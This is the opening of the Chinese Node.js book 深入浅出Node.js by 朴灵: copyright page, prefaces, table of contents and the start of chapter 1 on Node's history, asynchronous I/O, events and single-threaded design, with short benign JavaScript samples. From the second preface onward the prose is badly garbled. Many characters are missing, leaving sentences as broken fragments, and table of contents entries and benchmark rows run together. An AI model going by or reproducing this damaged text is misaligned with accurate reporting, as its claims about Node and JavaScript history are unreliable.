> 深入浅出Node.js  
> 出版时间：2013-12-01  
> 作者：朴灵

内  容  提  要
本书从不同的视角介绍了 Node 内在的特点和结构。由首章 Node介绍为索引，涉及 Node的各个方面，主要内容包含模块机制的揭示、异步 I/O实现原理的展现、异步编程的探讨、内存控制的介绍、二进制数据 Buffer的细节、Node中的网络编程基础、Node中的 Web开发、进程间的消息传递、Node测试以及通过 Node构建产品需要的注意事项。最后的附录介绍了 Node的安装、调试、编码规范和 NPM仓库等事宜。
本书适合想深入了解 Node 的人员阅读。
◆编　　著　朴　灵责任编辑　王军花执行编辑　董苗苗责任印制　焦志炜
◆ 人民邮电出版社出版发行　　北京市丰台区成寿寺路11号邮编　100164　　电子邮件　315@ptpress.com.cn网址　http://www.ptpress.com.cn北京　　　　　　印刷
◆ 开本：800×1000　1/16印张：21.75 字数：514千字 2013年 12月第 1 版印数：1 — 4 000册 2013年 12月北京第 1 次印刷 
定价：69.00元
读者服务热线：(010)51095186转600　印装质量热线：(010)81055316反盗版热线：(010)81055315广告经营许可证：京崇工商广字第 0021 号
图灵社区会员 Eric Liu(guangqiang.dev@gmail.com)专享 尊重版权
序一
没有用过Node的人，是不会相信仅凭JavaScript这门活跃于网页编程的脚本语言就可以驱动后端复杂的应用程序，也不会相信Node在开发高并发、高性能后端服务程序上也有着极大的优势。
我们在2010年接触Node的时候，国内外了解Node的人寥寥可数，2011年我们已经决定在淘宝的部分生产系统中开始使用Node。由于招募熟悉Node的人才是个大问题，为了树立技术品牌，我们在2011年年初创办CNode开源技术社区（CNodeJS.org），没有想到一发不可收拾。从2011年4月开始，我们走遍北京、上海、广州、深圳、杭州，甚至还到了香港，发起并且组织了多次NodeParty线下技术分享。为了弥补初学者没有Node托管环境学习测试的问题，我们还自己研发了NodeAppEngine。Node在国内深入人心，我相信与CNode社区有着不小的关系。
最初，Node的爱好者大都是些喜欢探索新技术的极客。在社区，我们也认识了很多天南海北的朋友，包括朴灵。在一次上海Node技术分享会后，我邀请他加入了淘宝。他在淘宝工作之余继续为社区作贡献，自发为Node的推广做了很多事情，包括今天他呕心写了这本书，我相信这是目前质量最高的一本Node图书。因为中国没有几个人像朴灵一样，有机会在很多高并发的应用场景中反复实践。这绝对是一本实践性极强的技术书，不管是否学习过Node，只要你爱好技术，都推荐你阅读它。
空无 CNode社区创始人阿里巴巴数据平台事业部数据交换平台总监

序` 
Node生于2009年，天才的屌年RyanDahl用了Google的V8了于事环实的I/O。也Ryan时JavaScript作为服务开发语言，只是因为V8的性能他脚本语言，是这为Node的极要的因。不仅仅是JavaScript大的用，要的是JavaScript之前没有I/O，这使Node在开发I/O时不会像EventMachine、Twisted样因与I/O用问题。
几年的时，Node了大的。在开源社区GitHub上，Node高。express、socket.io这样的优都有着极高的，NPM上的数量下量也人。可喜的是，国内的Node社区也生了多优的开源目，中node-webkit、pomelo在国开源社区中都产生了一定的。
在，Node的应用也广。LinkedIn的动已经部从Ruby到Node，机数量为的分之一。像Yahoo、Microsoft这样的大，有好多应用已经到Node了。国内的、网、、新、的很多线上产品也用Node开发，并了很好的。
朴灵是国内最的Node开发者之一，不仅组织了CNode社区，在InfoQ发的深入Node.js系是对国内的Node社区产生了大的。我在2011年初次接触Node的时候，了国外的几个，本上没有Node相关的图书，最我深的，
问是朴灵的深入Node.js系。是这一系，使我们好解、学习Node后，开发了pomelo，也定了朴灵在国内Node的。
今年过了，国内外的Node图书也了不。国内的几本书有，使国外的几本很大的书也没有我有动读书，因为内上没有大深，对于有开发经的Node开发者不是很大。不过朴灵我这本书时，我收多。相他Node图书的作者，他在淘宝一线的开发经使这本书有深，他年的景这本书读起极，他的研这本书在上很有深。，朴灵在上自一个能定数的人还不是的，在4中，他了Node的数过深的解决，EventProxy、Promise、async、step、wind.js解决都有深入解。外，朴灵还是EventProxy的作者，在这有最的实践经。
朴灵是国内Node的一，了一系，他还在国组织了NodeParty 
JSConfChina（2012年的JS 2013年的京JS），并且在上以的Node。在个技术大会上，我们都可以到朴灵的。强的是，朴灵在次大会上做的很，他是能Node的，后很认，以的解接。
因，朴灵要写这本书时，我们都很。能他问，这是国内一的Node图书。今，经过一年多的，你们于有机会到朴灵这一年多动的了。
S í pomelo创始人 2013 . 7$ 8

  . 
2006年至今，我们时可以到JavaScript的新，开始只是JavaScript性能的，到后发很多是自HTML5 Node创的。只，很人这是一。这人不可信，以了以下本的解。
. Node定是几个前端工程在实的。
为了后端后端，有
发了一门新语言
. JavaScript的了。
上，JavaScript不应在后端。前端工程要了。一，大到JavaScript在个，他语言的开发者它的，

心它对前从事的语言一，人们还是有JavaScript只能做前端脚本的定势。因，还是因为人们次上的认，以会产生一些有的不。
1995年，JavaScript网景发的NetscapeNavigator2.0发，它最为LiveScript，后为JavaScript。它自今的Mozilla的CTO——Brendan Eich之，产生源于网景发的Netscape Navigator要一脚本语言做一些的动作。时网景与Sun作
，不技术的管到一个Java的脚本语言，以能像Java一样。Brendan Eich本入网景是做Scheme语言的开发，是接到了一个不喜欢的务，于时势，不不事，于是JavaScript之在10天的时了JavaScript的，时的目是Mocha，LiveScript。
这门语言了起像Java外，本质与Java语言相甚，管的Java Script实了C、Scheme、Self、Java的。管，是这门语言还是了他语言的不优，数、继。于Java下的这门语言了它最的JavaScript。至今，还有多人分不Java与JavaScript的关系，就像分不与一样。
JavaScript的产生与Netscape Navigator的有关系，它并只是用于前端的。在1994年，网景就了NetscapeEnterprise Server中的一服务端脚本实，它的LiveWire，是最的服务端JavaScript，甚至于中的JavaScript。对于这门图灵的语言，网景就开始试它用在后端。
后，在一次大时，于1996年发的IE3.0中也包了它的脚本语言JScript。于的因，它JScript，是与JavaScript。在1997年年初，在它的服务IIS 3.0中也包了JScript，这就是我们在ASP中能使用的脚本语言。于与网景相对，于自己的目的，网景推了JavaScript的程，于1996年11月JavaScript ECMA国组织，在1997年7月了一个本，是为ECMA-262，ECMAScript。
可以到，JavaScript一就能在前后端，，在前后端自的不相。着Java、PHP、.NET服务端技术的，与前端中的JavaScript要相，服务端JavaScript。只下Rhino、SpiderMonkey用于工。
，这个是的。一次大后的JavaScript的有些，在生一些。Google对Ajax的应用JavaScript要。Firefox的发起了对IE的反，了次大，JavaScript的性能不，Chrome的加入它高。CommonJS的，不在JavaScript。ECMAScript的不推，语言加，不。
端JavaScript在Web应用中，甚至人们了JavaScript可以在服务端这事。是，服务端JavaScript在了，因为Node生了。Node的生不开上的
机，服务端JavaScript在的中下，Node新这个活。Ryan Dahl于对高性能Web服务的探索，了服务端JavaScript的一新。Node凭V8的高性能I/OJavaScript新推了一个高。在，Node不仅JavaScript时在前后端，且性能还分高。与统中的不，它甚至可于前的高脚本语言。
的反应还在继续，前后端要语言开发的已经开始，因为语言的不，开发者的分工也了分前端工程后端工程。技能因为分工，也技能为，前端工程不能后端开发，后端工程不定前端开发，树立的。Node的这分工的开始了。时一些后端工程也关到Node，他们甚至不关心前后端语言是否一，是对Node高性能的，实时、高并发。
大量的前后端工程加入了Node的开发，GitHub上JavaScript是最活跃的开发语言，NPM社区的下量都着这个过程不可，在这一能的NPM，能到你要的解决。很多不的目创都因为Node前端开发能用一语言。言之，Node的本是一个高性能的网的，了JavaScript社区的，并强大的生系统。

目前，还没有一本书Node自，大多在Node者、的使用上，本书从不的Node自己内在的。也你已经用过Node 相关的开发，在使用了Node的喜后，还能在阅读本书时，发一，Node是这样的，这就是本书的。
对于Node初学者，目前上也已经有Node相关的入门书，它们可以你入Node开发之。在了解了这些本过程后，想了解多Node识的好心，会你阅读本书的。

本书并序，2是从组织Node，3是从Node，4是从编程Node，5是Node中内的，6的是Node中的数在I/O中的，7是Node在网服务的，8是Node在HTTP上的，9了Node的机，10是从测试性能测试的关Node，11已经了Node编的，是在产品的Node，也会有收。
下是的。
1这一要了Node，从中可以了解Node的发程的。
2这一了Node的机，从中可以了解到Node是实CommonJS 包的。在这一中，我们解了在用过程中的编、加。外，我们还能读到深的关于Node自源的组织。
3这一了在Node中我们I/O作为要的因。外，还会-到I/O的实过程。
4这一要编程，中有的编程问题，也有的解决。在这一中，我们可以接触到Promise、事、高数是程的。
5这一要了Node中的内，要内有收、内、内、内、大内应用。
6这一了前端JavaScript不能到的Buffer。由于Node中会的网I/O，数会是很的为，这部分场景与的前端开发不。
7这一了Node的TCP、UDP、HTTP编程，还了WebSocket与TLS、HTTPS的。

8这一了Web应用的过程中用到的大多数技术，数、由、MVC、、RESTful 
9这一了Node的多程技术，以多程的应用的可用
性性能。10这一了Node的测试性能测试技。
11 者，产品开发的编写后，才了目的一。这一了Node产品要到的，目工程、部、、性能、
、定性、。
A了Node的。
B了Node的试技。
C探了实践多人作过程中要关的编问题，它可以很好一些的、的。
D作为开发者，关的管。在这一中，我们了过有NPM解决的问题。


  
这本书的产过程实不在之中。最到我的海初还在图灵，还是2011年的时候，作为Node发友，我实是极心的，因为我了作为前端工程有的JavaScript识外，只有学习Node的情，时我分动，后绝了的邀请。
后，在CNode社区到我的用Node.js你的服务后，邀请我加入他在InfoQ上开的深入Node.js，于对写作的，我也绝了的邀请。后以写只要个月写，写书的由服我，我在心中了，可以自己的学习经写，学写，前前后后大可以写多，于是应了。在后的大年时，我在InfoQ上发了7。可能是小，在Node创书作者的过程中经过一从的推荐下到了我这。因为心中已经有些目，自己想要些，加上加入数数产品部门（EDP）从事Node开发后，的都分我，这使之中由我，于是应了这本书的写作。
，这只是的开始，管天接触的还是JavaScript语言，实上已经从前端入了后端，我的识不以这本书的写作。的过程是相的，很有人喜欢试已有的习，我还要在这个上我还不熟悉的新分享，要没有，这是写作高多的，为我次有上了的。上，因为Node是JavaScript语言，以前端工程它是相对的，是事实上，者，熟悉JavaScript只是我了，在个程中，还有要，这就是与实之的。
经了、以因为没能iPad，最了这本书的内。与大多数Node的书不，这些内的写作过程就是我自己学习Node的过程，这个过程了的收，一的都不相，都是Node。我在这个过程中了自己在作系统、网的识补，的过程是喜的，过因为前后端语言的不分的识，因为Node新组接起，这大就是到的connecting the dots。写这本书时，我前端工程的已经，且认为是对我过程的认可。
最后，本书的，CNode社区的朋友们宝，EDP部门我最好的环境，这本书。
想不到经以年自的我，以这样的了一本书的写作，在之外，也在之中。这本书也不能用，这献我的，没有的，不可能在这本书。

  ) 
. 1 Node . ...........................................1 
1.1 Node的诞生历程 .......................................1 1.2 Node的命名与起源 ...................................1 1.2.1 为什么是 JavaScript.......................2 
1.2.2 为什么叫 Node ...............................2 
1.3 Node给 JavaScript带来的意义 .................2 1.4 Node的特点 ..............................................4 1.4.1 异步 I/O..........................................4 1.4.2 事件与回调函数 .............................6 1.4.3 单线程 ............................................7 1.4.4 跨平台 ............................................7 1.5 Node的应用场景 .......................................8 1.5.1 I/O密集型 ......................................8 
1.5.2 是否不擅长 CPU密集型业务 ........8 
1.5.3 与遗留系统和平共处 ...................10 
1.5.4 分布式应用 ..................................10 
1.6 Node的使用者 .........................................10 
1.7 参考资源 ..................................................11 
............................................12
. 2 
 
2.1 CommonJS规范.......................................13 
2.1.1 CommonJS的出发点 ...................13 
2.1.2 CommonJS的模块规范 ................14 
2.2 Node的模块实现 .....................................15 
2.2.1 优先从缓存加载 ...........................16 
2.2.2 路径分析和文件定位 ...................16 
2.2.3 模块编译 ......................................18 
2.3 核心模块 ..................................................20 
2.3.1 JavaScript核心模块的编译过程..............................................21 
2.3.2 C/C++核心模块的编译过程 .........22 
2.3.3 核心模块的引入流程 ...................25 
2.3.4 编写核心模块 ..............................25 
2.4 C/C++扩展模块 .......................................27 
2.4.1 前提条件 ......................................28 
2.4.2 C/C++扩展模块的编写 ................29 
2.4.3 C/C++扩展模块的编译 ................30 
2.4.4 C/C++扩展模块的加载 ................31 
2.5 模块调用栈 ..............................................32 
2.6 包与 NPM................................................33 
2.6.1 包结构 ..........................................34 
2.6.2 包描述文件与 NPM .....................34 
2.6.3 NPM常用功能 .............................37 
2.6.4 局域 NPM ....................................42 
2.6.5 NPM潜在问题 .............................43 
2.7 前后端共用模块 ......................................44 
2.7.1 模块的侧重点 ..............................44 
2.7.2 AMD规范....................................44 
2.7.3 CMD规范 ....................................45 
2.7.4 兼容多种模块规范 .......................45 
2.8 总结 ......................................................... 46 
2.9 参考资源 ..................................................46 
. 3 9 I/O.............................................47 
3.1 为什么要异步 I/O....................................47 
3.1.1 用户体验 ......................................48 
3.1.2 资源分配 ......................................49 
3.2 异步 I/O实现现状 ...................................50 
3.2.1 异步 I/O与非阻塞 I/O .................50 
3.2.2 理想的非阻塞异步 I/O.................54 
3.2.3 现实的异步 I/O............................54 
3.3 Node的异步 I/O......................................56 
3.3.1 事件循环 ......................................56 
3.3.2 观察者 ..........................................56 
3.3.3 请求对象 ......................................57 
3.3.4 执行回调 ......................................59 
3.3.5 小结 ..............................................60 
3.4 非 I/O的异步 API ...................................60 
3.4.1 定时器 ..........................................60 process.nextTick()......................61
3.4.2 setImmediate().............................62
3.4.3 
3.5 事件驱动与高性能服务器 .......................63 
3.6 总结 ......................................................... 65 
3.7 参考资源 .................................................65 
. 4 ............................................66 
4.1 函数式编程 ..............................................66 
4.1.1 高阶函数 ......................................66 
4.1.2 偏函数用法 ..................................67 
4.2 异步编程的优势与难点 ...........................68 
4.2.1 优势 ..............................................69 
4.2.2 难点 ..............................................70 
4.3 异步编程解决方案 ..................................74 
4.3.1 事件发布 /订阅模式 ......................74 
4.3.2 Promise/Deferred模式 .................82 
4.3.3 流程控制库 ..................................93 
4.4 异步并发控制 ........................................105 
4.4.1 bagpipe的解决方案 ...................105 
4.4.2 async的解决方案 ......................109 
4.5 总结 ....................................................... 110 
4.6 参考资源 ...............................................110 
..........................................111 
. 5 {
 
5.1 V8的垃圾回收机制与内存限制 ...........111 5.1.1 Node与 V8.................................112 5.1.2 V8的内存限制 ...........................112 5.1.3 V8的对象分配 ...........................112 5.1.4 V8的垃圾回收机制 ...................113 
5.1.5 查看垃圾回收日志 .....................119 
5.2 高效使用内存 ........................................121 
5.2.1 作用域 ........................................121 
5.2.2 闭包 ............................................123 
5.2.3 小结 ............................................124 
5.3 内存指标 ...............................................124 
5.3.1 查看内存使用情况 ....................124 
5.3.2 堆外内存 ....................................126 
5.3.3 小结 ...........................................127 
5.4 内存泄漏 ...............................................127 
5.4.1 慎将内存当做缓存 ....................127 
5.4.2 关注队列状态 ............................130 
5.5 内存泄漏排查 ........................................130 5.5.1 node-heapdump..........................131 5.5.2 node-memwatch.........................132 
5.5.3 小结 ...........................................135 
5.6 大内存应用 ...........................................135 
5.7 总结 ....................................................... 136 
5.8 参考资源 ...............................................136 
.....................................137 
. 6 · Buffer 
6.1 Buffer结构 ............................................137 
6.1.1 模块结构 ....................................137 
6.1.2 Buffer对象 ................................138 
6.1.3 Buffer内存分配 .........................139 
6.2 Buffer的转换 ........................................141 
6.2.1 字符串转 Buffer.........................141 
6.2.2 Buffer转字符串 .........................142 
6.2.3 Buffer不支持的编码类型 .........142 
6.3 Buffer的拼接 ........................................143 
6.3.1 乱码是如何产生的 ....................144 
6.3.2 setEncoding()与 string_ decoder()...................................144 
6.3.3 正确拼接 Buffer.........................145 
6.4 Buffer与性能 ........................................146 
6.5 总结 ....................................................... 149 
6.6 参考资源 ...............................................149 
. 7 . .........................................150 
7.1 构建 TCP服务 ......................................150 7.1.1 TCP............................................150 
7.1.2 创建 TCP服务器端 ...................151 
7.1.3 TCP服务的事件 ........................153 
7.2 构建 UDP服务......................................154 
7.2.1 创建 UDP套接字 ......................154 
目 录 
7.2.2 创建 UDP服务器端 ...................154 
7.2.3 创建 UDP客户端 .......................155 
7.2.4 UDP套接字事件 ........................155 
7.3 构建 HTTP服务 ....................................155 7.3.1 HTTP..........................................156 
7.3.2 http模块....................................157 
7.3.3 HTTP客户端 ..............................161 
7.4 构建 WebSocket服务 ............................163 
7.4.1 WebSocket握手 .........................164 
7.4.2 WebSocket数据传输 ..................167 
7.4.3 小结 ............................................169 
7.5 网络服务与安全 ....................................169 7.5.1 TLS/SSL.....................................170 
7.5.2 TLS服务 ....................................172 
7.5.3 HTTPS服务 ...............................173 
7.6 总结 ....................................................... 175 
7.7 参考资源 ................................................176 
. 8 . Web ü ...............................177 
8.1 基础功能 ................................................177 
8.1.1 请求方法 ....................................178 
8.1.2 路径解析 ....................................179 
8.1.3 查询字符串 ................................180 ........................................181 
8.1.4 Cookie 8.1.5 Session........................................184 
8.1.6 缓存 ............................................190 
8.1.7 Basic认证 ..................................193 
8.2 数据上传 ................................................195 
8.2.1 表单数据 ....................................195 
8.2.2 其他格式 ....................................196 
8.2.3 附件上传 ....................................197 
8.2.4 数据上传与安全 .........................199 
8.3 路由解析 ................................................201 
8.3.1 文件路径型 ................................202 8.3.2 MVC...........................................202 8.3.3 RESTful......................................207 
8.4 中间件 ....................................................210 
8.4.1 异常处理 ....................................214 
8.4.2 中间件与性能 .............................215 
8.4.3 小结 ............................................216 
8.5 页面渲染 ................................................217 
8.5.1 内容响应 ....................................217 
8.5.2 视图渲染 ....................................219 
8.5.3 模板 ............................................220 8.5.4 Bigpipe.......................................231 
8.6 总结 ....................................................... 235 
8.7 参考资源 ................................................235 . 9 ..........................................236 
9.1 服务模型的变迁 ....................................236 
9.1.1 石器时代：同步 .........................236 
9.1.2 青铜时代：复制进程 .................237 
9.1.3 白银时代：多线程 .....................237 
9.1.4 黄金时代：事件驱动 .................237 
9.2 多进程架构 ............................................238 
9.2.1 创建子进程 ................................239 
9.2.2 进程间通信 ................................240 
9.2.3 句柄传递 ....................................242 
9.2.4 小结 ............................................247 
9.3 集群稳定之路 ........................................248 
9.3.1 进程事件 ....................................248 
9.3.2 自动重启 ....................................249 
9.3.3 负载均衡 ....................................254 
9.3.4 状态共享 ....................................255 
9.4 Cluster模块 ...........................................257 
9.4.1 Cluster工作原理 ........................258 
9.4.2 Cluster事件................................259 
9.5 总结 ....................................................... 259 
9.6 参考资源 ................................................260 . 10  ................................................261 
10.1 单元测试 ..............................................261 
10.1.1 单元测试的意义 .....................261 
10.1.2 单元测试介绍 .........................263 
10.1.3 工程化与自动化 .....................276 
10.1.4 小结 ........................................277 
10.2 性能测试 ..............................................278 
10.2.1 基准测试 ................................278 
10.2.2 压力测试 ................................280 
10.2.3 基准测试驱动开发 .................281 
10.2.4 测试数据与业务数据的转换 ...283 
10.3 总结 ..................................................... 284 
10.4 参考资源 ..............................................284 
. 11  ............................................285 
11.1 项目工程化 ..........................................285 
11.1.1 目录结构 ................................285 
11.1.2 构建工具 ................................286 
11.1.3 编码规范 ................................289 
11.1.4 代码审查 ................................289 
11.2 部署流程 ..............................................290 
11.2.1 部署环境 ................................291 
11.2.2 部署操作 ................................291 
11.3 性能 ..................................................... 293 
11.3.1 动静分离 ................................293 
11.3.2 启用缓存 ................................294 
11.3.3 多进程架构 ............................294 
11.3.4 读写分离 ................................295 
11.4 日志 ..................................................... 295 
11.4.1 访问日志 ................................295 
11.4.2 异常日志 ................................296 
11.4.3 日志与数据库 ........................299 
11.4.4 分割日志 ................................299 
11.4.5 小结 ........................................299 
11.5 监控报警 ..............................................299 
11.5.1 监控 ........................................300 
11.5.2 报警的实现 ............................302 
11.5.3 监控系统的稳定性 .................303 
11.6 稳定性 .................................................303 
11.7 异构共存 ..............................................304 
11.8 总结 ..................................................... 305 
11.9 参考资源 ..............................................305 
) A. Node .......................................306 
A.1 Windows系统下的 Node安装 .............306 
A.2 Mac系统下 Node的安装 .....................307 
A.3 Linux系统下 Node的安装...................308 
A.4 总结 ...................................................... 309 
A.5 参考资源 ...............................................309 
) B. Node ................................ 310 B.1 Debugger...............................................310 
B.2 Node Inspector......................................311 
B.2.1 安装 Node Inspector .................312 
B.2.2 错误堆栈 ..................................312 
B.3 总结 ...................................................... 313 
) C Node ...............................314 
C.1 根源 ...................................................... 314 
C.2 编码规范 ...............................................315 
C.2.1 空格与格式 ..............................315 
C.2.2 命名规范 ..................................317 
C.2.3 比较操作 ..................................318 
C.2.4 字面量 ......................................318 
C.2.5 作用域 ......................................318 
C.2.6 数组与对象 ..............................319 
C.2.7 异步 ..........................................320 
C.2.8 类与模块 ..................................320 
C.2.9 注解规范 ..................................321 
C.3 最佳实践 ...............................................321 
C.3.1 冲突的解决原则 .......................321 
C.3.2 给编辑器设置检测工具 ...........321 
C.3.3 版本控制中的 hook..................322 
C.3.4 持续集成 ..................................322 
C.4 总结 ...................................................... 322 
C.5 参考资源 ...............................................323 
) D3 NPM ......................324 
D.1 NPM仓库的安装 ..................................325 
D.1.1 安装 Erlang和 CouchDB .........325 
D.1.2 搭建 NPM仓库 ........................326 
D.2 高阶应用 ..............................................328 
D.2.1 镜像仓库 ..................................328 
D.2.2 私有模块应用 ..........................328 
D.2.3 纯私有仓库 ..............................329 
D.3 总结 ...................................................... 331 
D.4 参考资源 ..............................................332 
Node.  
第1章 



Node应是今最的技术了，从本开始，我们它的多。
1.1 Node . 
Node的生程下。. 2009年3月，RyanDahl在客上于V8创一个量的Web服务并一。
. 2009年5月，RyanDahl在GitHub上发了最初的本。. 2009年12月2010年4月，JSConf大会都了Node的。
. 2010年年，Node服务Joyent的，创始人Ryan Dahl加入
JoyentNode的发。. 2011年7月，Node在的下发了Windows本。

. 2011年11月，NodeRuby on Rails，为GitHub上关最高的目（后Bootstrap目，目前）。
. 2012年1月，RyanDahl在对Node的情下，门人的IsaacZ. Schlueter，自己一些研目。IsaacZ.Schlueter是Node的包管NPM的作者，之后Node的本发bug复工作由他接。
至者之（2013年7月13），发的Node定为v0.10.13，定为v0.11.4，

NPM的数到34 943个，的下量为1479次。后，Node的发要中在性能上，在v0.14之后，发v1.0本。

1.2 Node 
在Node的网（http://nodejs.org）之外，Node有很多Nodejs、NodeJS、Node.js。本书在写作过程中的，会一使用Node这个，是在前语境之外，为了与余的技术相区，可以上.js它是Node。在到这些时，应识到，它们的是一事。了本书的会用到Node.js外，余都会以Node作为。
Node的由，实它的起源是有关系的。
1.2.1 JavaScript 
Ryan Dahl是一深的C/C++程序，在创Node之前，他的要工作都是高性能Web服务的。经过一些试之后，他到了高性能，Web服务的几个要事驱动、I/O。
以Ryan Dahl最初的目是写一个于事驱动、I/O的Web服务，以到高的性能，Apache服务之外的。他到，大多数人不一有的程序的要因是他们用到了I/O的。写作Node的时候，RyanDahl经过C、Lua、Haskell、Ruby语言作为实，为C的开发门高，可以不会有多的开发者能它用于的务开发，以它RyanDahl自己还不Haskell，以它Lua自已经有很多I/O，为I/O也不能人们继续使用I/O的习，以也它Ruby的机由于性能不好。
相之下，JavaScriptC的开发门要，Lua的包要。管服务端JavaScript在已经很多年了，是后端部分一没有场，可以包为，为入I/O没有外。外，JavaScript在中有广的事驱动的应用，Ryan Dahl喜好于事驱动的。时，次大也分高下，Chrome的JavaScriptV8性能一的，且于新BSD可发，自到Ryan Dahl的欢。到高性能、事驱动、没有包这个要因，JavaScript为了Node的实语言。

1.2.2 Node 
起初，RyanDahl他的目为web.js，就是一个Web服务，是目的发过了他最初开发一个Web服务的想，了网应用的一个，这样可以在它的上多的，服务、客端、工。Node发为一个强不享源的线程、程系统，包分网的，为大分应用程序，目
也是为一个、可的网应用。它自，过信组织多Node，过大网应用的目的。一个Node程都这个网应用中的一个，这是它的。


1.3 Node JavaScript  
V8Chrome了一个强的心，使它在大中，也使Ryan Dahl在语言中为JavaScript加了一个极大的。这我们要NodeJavaScript
1.3 Node K JavaScript的  3 
的一个新。于Node之前些不的后端JavaScript实，在性能编程没能到与他语言一高下的程，这开不，Node与的对。
ChromeNode的组图1-1。我们中了V8作为JavaScript外，还有一个WebKit。 HTML5在发过程中定了多的API。在实上，了多的能JavaScriptHTML。这个景好，对于前端的发言，HTML5统一的过程是相对的。JavaScript作为一门图灵的语言，以在的中，它的能决于中的有多。

图1-1 ChromeNode的组
了HTML、WebKit这些UI相关技术没有外，Node的与Chrome分相。它们都是于事驱动的，过事驱动服务上的，Node过事驱动服务I/O，这个在3中。在Node中，JavaScript可以心问本，可以WebSocket服务端，可以接数，可以Web Workers一样多程。今，JavaScript可以在不的，不继续在中与CSS样、DOM树。HTTP是，Node就是在一的。Node不UI，用与相的机。Node了过JavaScript只能在中的。前后端编程环境统一，可以大大前后端要的上下。
对于前端工程言，自己熟悉的JavaScript今可以在一个，不他因，仅仅因为好，就关探它。
Node的 JavaScript的总无的。社区 node-webkit样的. 2012的JS。文的的node-webkit中Node中的事. WebKit的事) HTMLCSS的UI/ 的。的t HTMLCSSJavaScript。

1.4 Node 
作为后端JavaScript的，Node了前端JavaScript中些熟悉的接，没有
写语言本的性，于作用，区在于它前端中广用的想到了服务端。下我们Node相他语言的一些。
1.4.1 I/O 
关于I/O，前端工程解起会一些，因为发起Ajax用对于前端工程言是熟悉不过的场景了。下的用于发起一个Ajax请
$.post('/url', {title: '入出 Node.js'}, function (data) { 
console.log('收响应 '); 
}); 
console.log('发Ajax结'); 
熟悉的用，收到应是在发Ajax之后的。在用$.post()后，后续是立的，收到应的时是不的。我们只它在这个请后，并不的时。用中对于的是Don’t call me, I will call you的的，这也是，不关心过程的一。图1-2是一个经的Ajax用。

图1-2经的Ajax用
在Node中，I/O也很。以读为，我们可以到它与前端Ajax用的是极的
1.4 Node的  5 
var fs = require('fs'); 
fs.readFile('/path', function (err, file) { 
console.log('读文件成 ') }); console.log('发读文件 '); 
这的发起读是在读之前的。样，读的也决于读的用时。图1-3是一个经的用。

图1-3经的用
在Node中，绝大多数的作都以的
用。Ryan Dahl，在了很多I/O的API，从读到网请，是。这样的在于，在Node中，我们可以从语言很自并I/O作。个用之之前的I/O用。在编程上可以极大。
下的个读务的时决于最的个读的时
fs.readFile('/path1', function (err, file) { 
console.log('读文件 1成'); 
}); 
fs.readFile('/path2', function (err, file) { 
console.log('读文件 2成'); 
}); 
对于I/O言，它们的时是个务的时之。这的优势是的。
关于I/O是的本的机实，我们在3中。
1.4.2
着Web 2.0时的到，JavaScript在前端了多的，事也到了广的应用。Node不像Rhino样Java的很大，是前端中应用广且熟的事入后端，
I/O，事务。
下的的是Ajax的服务端过程。Node创一个Web服务，并8080端。对于服务，我们为定了request事，对于请对，我们为定了data事end事
var http = require('http'); var querystring = require('querystring'); 
//服务器的 request事件 
http.createServer(function (req, res) { 
var postData = ''; 
req.setEncoding('utf8'); 
// 请求的 data事件 
req.on('data', function (trunk) { 
 postData += trunk; 
}); 
// 请求的 end事件 
req.on('end', function () {
 res.end(postData); 
}); 
}).listen(8080); 
console.log('服务器启动成 ');
相应，我们在前端为Ajax请定了success事，在发请后，只关心请时
相应的务可，相关下
$.ajax({ 
'url': '/url', 
'method': 'POST', 
'data': {}, 
'success': function (data) {
 // success事件 
} 
}); 
相之下，在前端还是后端，事都是用的。对于他语言，这拾是JavaScript的熟悉是本不会的。
事的编程有量、、只关事务优势，是在多个务的场景下，事与事之自立，作是一个问题。
从前可以到，数不在。这是因为在JavaScript中，我们数作为一对，可以数作为对作为实用。
与他的Web后端编程语言相，Node了事外，数是一大。下，数也是最好的接用数的。是这编程对于很多习编程的人，也是分不习的。的编写序与序并关系，这对他们可能阅
1.4 Node的  7 
读上的。在程，因为了数，与的相，不一目了了。
在为编程后，过对务的分对事的，在程务的复杂与实上是一的。
关于程事作的技，我们在4中一探。


1.4.3
Node了JavaScript在中线程的。且在Node中，JavaScript与余线程是
享的。线程的最大好是不用像多线程编程样在的问题，这没有的在，也没有线程上下的性能上的开。
样，线程也有它自的，这些是学习Node的过程中要对的。极对这些，可以享到Node的好，也能在的问题，使以高用。线程的有以下3。
用多CPU。
会起个应用，应用的性。
大量用CPU继续用I/O。

像中JavaScript与UI用一个线程一样，JavaScript时会UI的应中。在Node中，时的CPU用也会后续的I/O发不用，已的I/O的数也会不到时。
最解决这大量问题的是Google开发的Gears。它用一个立的程，要的程序发这个程，在后，过事。这个量分发到他程上，以的几。后，HTML5定了WebWorkers的，Google了Gears，WebWorkers。WebWorkers能创工作线程，以解决JavaScript大UI的问题。工作线程为了不线程，过的，这也使工作线程不能问到线程中的UI。
Node用了与WebWorkers相的解决线程中大量的问题child_process。
程的，着Node可以从应对线程在性用多CPU的问题。过分发到个程，可以大量分解，后过程之的事，这可以很好应用的。过Master-Worker的管，也可以很好管个工作程，以到高的性。
关于过程分用源应用的性，这是一个探的题。样才能使我们享到的线程编程，高用源请到9。
1.4.4
起初，Node只可以在Linux上。想在Windows上学习使用Node，
过Cygwin者MinGW。着Node的发，到了它的在，并入了一个Node实Windows的，在v0.6.0本发时，Node已经能接在Windows上了。图1-4是Node于libuv实的图。

图1-4 Node于libuv实的图
Windows*nix要于Node在的动，它在作系统与Node上系统之了一，libuv。目前，libuv已经为多系统实的组。关于libuv的，我们在3中。
过好的，Node的C++也可以libuv实。目前，了没有新的C++外，大部分C++都能实的。


1.5Node 
在技术之前，要了解一新技术样的场景，的技术用在的场景可以起到想不到的。关于Node，探多的要有I/OCPU。
1.5.1I/O
在Node的推广过程中，数次有人问起Node的应用场景是。有的脚本语言到一，从线程的，NodeI/O的能是起的。，
NodeI/O的应用场景本上是没人反对的。Node网且并I/O，能有
组织起多的源，从多好的服务。I/O的优势
要在于Node用事环的能
，不是动一个线程为一个请服务，源用极。
1.5.2CPU
一个，在CPU的应用场景中，Node是否能实上，V8的是分高的。以做，V8的是的。
1.5 Node的  9 
我们相的数（F0=0，F1=1，Fn =F(n1)+F(n2)(n2)）分用脚本语言写了实，并了n =40的，以性能。这个测试要CPU作，1-1是中一次时的。在这些脚本语言中（中CGo语言是语言，用于），Node是高的，它优的能要自V8的深性能优。
1-1

C with -O2 0m0.202s #0 i686-apple-darwin11-llvm-gcc-4.2 (GCC) 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2336.11.00) 
Node（C++）0m1.001s #1 v0.8.8,gcc -O2 
